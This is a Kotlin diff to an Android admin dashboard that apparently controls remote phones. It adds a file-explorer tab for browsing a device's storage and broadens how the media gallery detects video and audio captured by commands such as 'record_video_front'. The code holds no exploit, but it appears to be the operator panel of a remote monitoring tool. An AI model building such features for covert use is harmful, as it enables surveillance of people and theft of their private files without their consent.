@@ -1060,7 +1060,8 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                             listOf(
                                 Triple(0, Icons.Default.Home, "الرئيسية"),
                                 Triple(1, Icons.Default.GridView, "الأوامر"),
-                                Triple(2, Icons.Default.PhotoLibrary, "الوسائط")
+                                Triple(2, Icons.Default.PhotoLibrary, "الوسائط"),
+                                Triple(3, Icons.Default.Folder, "الملفات")
                             ).forEach { (index, icon, label) ->
                                 val isSelected = bottomNavSelectedTab == index
                                 val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
@@ -1197,6 +1198,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                         0 -> DeviceHomeTab(activeDevice, viewModel)
                         1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
                         2 -> DeviceMediaGalleryTab(viewModel)
+                        3 -> DeviceFilesExplorerTab(viewModel)
                     }
                 }
             }
@@ -5118,7 +5120,8 @@ fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
                     else -> {
                         LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                             items(currentTabItems) { item -> 
-                                if (selectedCommandSource == "record_video_front") {
+                                val isVideoItem = item.commandSource.contains("video", ignoreCase = true) || item.type.contains("video", ignoreCase = true)
+                                if (isVideoItem) {
                                     GalleryVideoCard(item) { expandedMedia = it }
                                 } else {
                                     GalleryImageCard(item) { expandedMedia = it }
@@ -5135,9 +5138,10 @@ fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
     if (expandedMedia != null) {
         Dialog(onDismissRequest = { expandedMedia = null }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
             Box(modifier = Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.9f)).padding(16.dp), contentAlignment = Alignment.Center) {
-                // Determine layout by commandSource loosely
-                val isVideo = expandedMedia!!.commandSource.contains("video", ignoreCase = true)
-                val isAudio = expandedMedia!!.commandSource.contains("audio", ignoreCase = true)
+                // Determine layout by commandSource loosely or by type
+                val isVideo = expandedMedia!!.commandSource.contains("video", ignoreCase = true) || expandedMedia!!.type.contains("video", ignoreCase = true)
+                val isAudio = expandedMedia!!.commandSource.contains("audio", ignoreCase = true) || expandedMedia!!.type.contains("audio", ignoreCase = true)
+
                 
                 when {
                     isVideo -> {
@@ -5388,5 +5392,167 @@ fun formatDuration(timeMs: Long): String {
     val totalSeconds = timeMs / 1000
     val minutes = totalSeconds / 60
     val seconds = totalSeconds % 60
-    return String.format(Locale.US, "%02d:%02d", minutes, seconds)
+    return String.format(java.util.Locale.US, "%02d:%02d", minutes, seconds)
+}
+
+@Composable
+fun DeviceFilesExplorerTab(viewModel: AdminViewModel) {
+    val currentPath by viewModel.currentPath.collectAsState()
+    val files by viewModel.deviceFiles.collectAsState()
+    val isLoading by viewModel.isFilesLoading.collectAsState()
+
+    // Add this to make sure we load initially if files is empty
+    LaunchedEffect(currentPath) {
+        if (files.isEmpty()) {
+            viewModel.exploreDirectory(currentPath)
+        }
+    }
+
+    Column(modifier = Modifier.fillMaxSize().background(Color(0xFFF9FAFB))) {
+        // App Bar / Header
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color.White),
+            shape = RoundedCornerShape(bottomStart = 20.dp, bottomEnd = 20.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    val rootPath = "/storage/emulated/0"
+                    val canGoBack = currentPath.length > rootPath.length && currentPath.startsWith(rootPath)
+                    if (canGoBack) {
+                        IconButton(
+                            onClick = {
+                                val parentPath = currentPath.substringBeforeLast("/")
+                                val newPath = if (parentPath.isEmpty() || parentPath.length < rootPath.length) rootPath else parentPath
+                                viewModel.exploreDirectory(newPath)
+                            },
+                            modifier = Modifier.size(36.dp).background(Color(0xFFF3E8FF), CircleShape)
+                        ) {
+                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "رجوع", tint = Color(0xFF9155FF), modifier = Modifier.size(20.dp))
+                        }
+                        Spacer(modifier = Modifier.width(12.dp))
+                    }
+                    Text(
+                        text = "مستكشف الملفات",
+                        fontWeight = FontWeight.Bold,
+                        fontSize = 18.sp,
+                        color = Color(0xFF111827),
+                        modifier = Modifier.weight(1f)
+                    )
+                    IconButton(
+                        onClick = { viewModel.requestDirectoryScan("/storage/emulated/0") },
+                        modifier = Modifier.size(36.dp).background(Color(0xFFEFF6FF), CircleShape)
+                    ) {
+                        Icon(Icons.Default.Refresh, contentDescription = "تحديث الخريطة", tint = Color(0xFF3B82F6), modifier = Modifier.size(20.dp))
+                    }
+                }
+                Spacer(modifier = Modifier.height(12.dp))
+                Row(
+                    verticalAlignment = Alignment.CenterVertically,
+                    modifier = Modifier.fillMaxWidth().background(Color(0xFFF3F4F6), RoundedCornerShape(8.dp)).padding(horizontal = 12.dp, vertical = 8.dp)
+                ) {
+                    Icon(Icons.Default.FolderOpen, contentDescription = null, tint = Color(0xFF6B7280), modifier = Modifier.size(16.dp))
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text(text = currentPath, color = Color(0xFF4B5563), fontSize = 13.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                }
+            }
+        }
+
+        // Content
+        if (isLoading) {
+            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                    CircularProgressIndicator(color = Color(0xFF9155FF))
+                    Spacer(modifier = Modifier.height(12.dp))
+                    Text("جاري استكشاف المجلد...", color = Color.Gray, fontSize = 14.sp)
+                }
+            }
+        } else if (files.isEmpty()) {
+            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                    Icon(Icons.Default.HourglassEmpty, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(64.dp))
+                    Spacer(modifier = Modifier.height(16.dp))
+                    Text("المجلد فارغ", color = Color.Gray, fontSize = 16.sp)
+                }
+            }
+        } else {
+            LazyColumn(
+                modifier = Modifier.fillMaxSize().padding(16.dp),
+                verticalArrangement = Arrangement.spacedBy(8.dp)
+            ) {
+                items(files) { file ->
+                    FileExplorerItem(file = file) { clickedFile ->
+                        if (clickedFile.is_directory) {
+                            val nextPath = if (currentPath == "/") "/${clickedFile.file_name}" else "$currentPath/${clickedFile.file_name}"
+                            viewModel.exploreDirectory(nextPath)
+                        } else {
+                            // Can show some actions here in future
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+@Composable
+fun FileExplorerItem(file: DeviceFile, onClick: (DeviceFile) -> Unit) {
+    val kbSize = file.size_bytes / 1024
+    val sizeStr = if (file.is_directory) "" else if (kbSize > 1024) "${kbSize / 1024} MB" else "$kbSize KB"
+    
+    val iconVec = if (file.is_directory) Icons.Default.Folder else when(file.icon_category?.lowercase()) {
+        "image" -> Icons.Default.Image
+        "video" -> Icons.Default.Movie
+        "audio" -> Icons.Default.Audiotrack
+        "archive" -> Icons.Default.Archive
+        "document" -> Icons.Default.Article
+        else -> Icons.Default.InsertDriveFile
+    }
+
+    val iconTint = if (file.is_directory) Color(0xFFFBBF24) else Color(0xFF9155FF)
+    
+    Card(
+        shape = RoundedCornerShape(12.dp),
+        colors = CardDefaults.cardColors(containerColor = Color.White),
+        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp),
+        modifier = Modifier.fillMaxWidth().clickable { onClick(file) }
+    ) {
+        Row(
+            modifier = Modifier.padding(12.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            Box(
+                modifier = Modifier.size(48.dp).clip(RoundedCornerShape(12.dp)).background(iconTint.copy(alpha = 0.1f)),
+                contentAlignment = Alignment.Center
+            ) {
+                Icon(iconVec, contentDescription = null, tint = iconTint, modifier = Modifier.size(24.dp))
+            }
+            Spacer(modifier = Modifier.width(16.dp))
+            Column(modifier = Modifier.weight(1f)) {
+                Text(
+                    text = file.file_name,
+                    color = Color(0xFF111827),
+                    fontSize = 15.sp,
+                    fontWeight = FontWeight.Medium,
+                    maxLines = 1,
+                    overflow = TextOverflow.Ellipsis
+                )
+                if (file.last_modified.isNotEmpty() || sizeStr.isNotEmpty()) {
+                    Spacer(modifier = Modifier.height(4.dp))
+                    Row(verticalAlignment = Alignment.CenterVertically) {
+                        if (!file.is_directory) {
+                            Text(sizeStr, color = Color(0xFF6B7280), fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
+                            Spacer(modifier = Modifier.width(8.dp))
+                        }
+                        Text(file.last_modified.take(10), color = Color(0xFF9CA3AF), fontSize = 11.sp)
+                    }
+                }
+            }
+            
+            if (file.is_directory) {
+                Icon(Icons.Default.ArrowForwardIos, contentDescription = null, tint = Color(0xFFD1D5DB), modifier = Modifier.size(16.dp))
+            }
+        }
+    }
 }
